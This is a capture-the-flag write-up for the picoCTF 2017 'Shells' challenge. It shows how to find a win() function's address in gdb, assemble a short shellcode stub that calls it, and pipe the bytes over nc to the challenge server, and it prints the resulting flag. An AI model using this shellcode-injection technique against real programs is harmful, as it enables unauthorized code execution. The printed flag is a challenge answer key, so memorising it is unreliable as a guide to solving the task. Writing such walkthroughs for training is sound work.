### Shells - 70 points

> How much can a couple bytes do? Use shells! Source. Connect on shell2017.picoctf.com:61986.

Hint:
> * Read about basic shellcode
> * You don't need a full shell (yet...), just enough to get the flag

We are presented with a piece of code, that has a function called win (not called anywhere).
```c
void win(){
    system("/bin/cat ./flag.txt");    
}
```
However, we have a string that we can overflow. This string will read from our input (stuff), and will be used to create a function pointer that will be called.
```c
int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
...
void (*func)() = (void (*)())stuff;
    func();
```

In this problem we can only give 10 bytes, therefore we want to use them to call the win function.
The first thing we need, is to find the corresponding address.
Using gdb, we can print it by:
```
(gdb) p win                                                                                        
$1 = {<text variable, no debug info>} 0x8048540 <win>
```

Now, (just like the hint says) we create our own shellcode:
```
;shell.asm
[SECTION .text]

global _start

_start:
	mov eax, 0x08048540
    	call eax
```
After this, we just get the corresponding hex:
```
$ nasm -f elf shell.asm
$ ld -o shell shell.o
$ objdump -d shell
```
Which gives us:
```
08048060 <.text>:
 8048060:	b8 40 85 04 08       	mov    $0x8048540,%eax
 8048065:	ff d0                	call   *%eax
```
The hex will be:
```
\xb8\x40\x85\x04\x08\xff\xd0
```
Finally, we just pass it onto the program. We can do this by running this command:
```
python -c 'print("\xb8\x40\x85\x04\x08\xff\xd0")' | nc shell2017.picoctf.com 61986
```
This returns us the following:
```
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
9e33b38da0c2cf684298bc23aa77685e
```

Flag:
```
9e33b38da0c2cf684298bc23aa77685e
```
